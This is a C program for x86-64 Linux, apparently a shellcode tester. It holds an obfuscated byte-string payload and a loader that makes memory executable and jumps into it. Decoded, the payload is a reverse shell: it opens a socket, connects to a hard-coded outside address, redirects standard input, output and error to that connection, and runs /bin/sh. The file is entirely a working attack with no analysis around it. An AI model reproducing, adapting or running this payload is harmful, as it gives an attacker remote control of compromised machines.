#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
char shellcode[] = "\x68\xfe\xff\xff\xff\x5f\x48\xf7\xd7\x48\xff\xc7\x68\xff\xff\xff\xff\x5e\x48\xf7\xd6\x48\xff\xc6\x48\xc1\xea\x20\x48\xc1\xea\x20\x68\xd7\xff\xff\xff\x58\x48\xf7\xd8\x0f\x05\x50\x5f\x68\xfe\xff\xff\xff\x58\x48\xf7\xd0\x48\xff\xc0\x66\x89\x04\x24\x68\xe1\x6f\xff\xff\x58\x48\xf7\xd8\x66\x89\x44\x24\x02\x68\xf6\xde\xfb\xa1\x58\x48\xf7\xd8\x89\x44\x24\x04\x48\xc1\xe8\x20\x48\xc1\xe8\x20\x48\x89\x44\x24\x08\x54\x5e\x68\xf0\xff\xff\xff\x5a\x48\xf7\xd2\x48\xff\xc2\x68\xd6\xff\xff\xff\x58\x48\xf7\xd0\x48\xff\xc0\x0f\x05\x48\x31\xf6\x68\xdf\xff\xff\xff\x58\x48\xf7\xd0\x48\xff\xc0\x0f\x05\x48\xc1\xe6\x08\x48\xc1\xe6\x08\x48\xc1\xe6\x08\x48\xc1\xe6\x08\x40\xb6\x01\x68\xdf\xff\xff\xff\x58\x48\xf7\xd8\x0f\x05\x48\xc1\xe6\x08\x48\xc1\xe6\x08\x48\xc1\xe6\x08\x48\xc1\xe6\x08\x40\xb6\x02\x68\xdf\xff\xff\xff\x58\x48\xf7\xd0\x48\xff\xc0\x0f\x05\x48\x89\xe3\xc6\x03\x2f\x48\xff\xc3\xc6\x03\x62\x48\xff\xc3\xc6\x03\x69\x48\xff\xc3\xc6\x03\x6e\x48\xff\xc3\xc6\x03\x2f\x48\xff\xc3\xc6\x03\x73\x48\xff\xc3\xc6\x03\x68\x48\xff\xc3\xc6\x03\x01\x80\x2b\x01\x48\xff\xc3\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x68\xc5\xff\xff\xff\x58\x48\xf7\xd0\x48\xff\xc0\x0f\x05";
void main() {
    printf("shellcode length: %u\n", strlen(shellcode));
    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ |
                    PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}